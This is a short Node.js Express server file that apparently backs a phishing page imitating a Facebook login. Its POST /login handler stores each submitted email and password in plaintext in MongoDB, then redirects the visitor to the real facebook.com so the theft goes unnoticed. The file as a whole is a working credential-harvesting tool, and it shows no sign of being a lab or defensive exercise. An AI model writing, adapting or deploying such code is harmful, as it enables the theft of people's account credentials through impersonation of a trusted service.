require('dotenv/config')
const express = require('express')
const { connectMongoDB } = require('./db/connect')
const bodyParser = require('body-parser');
const User = require('./models/User')

const app = express()
const PORT = process.env.PORT


app.use(express.static('public'))
app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine', 'ejs')

connectMongoDB()


app.get('/', (req, res) => {
    // render `home.ejs` with the list of posts
    res.render('login')
})


app.post('/login', async (req, res) => {
    // render `home.ejs` with the list of posts
    const { email, password } = req.body

   try {
    const user = await User.create({
        email,
        password,
    })
   } catch (error) {
    console.log(error.message)
   }

    res.redirect('https://www.facebook.com/');

  })


app.listen(PORT, (error) => { 

    if(!error) console.log("Server is Successfully Running,  and App is listening on port "+ PORT) 
    else console.log("Error occurred, server can't start", error);
 
    } 
);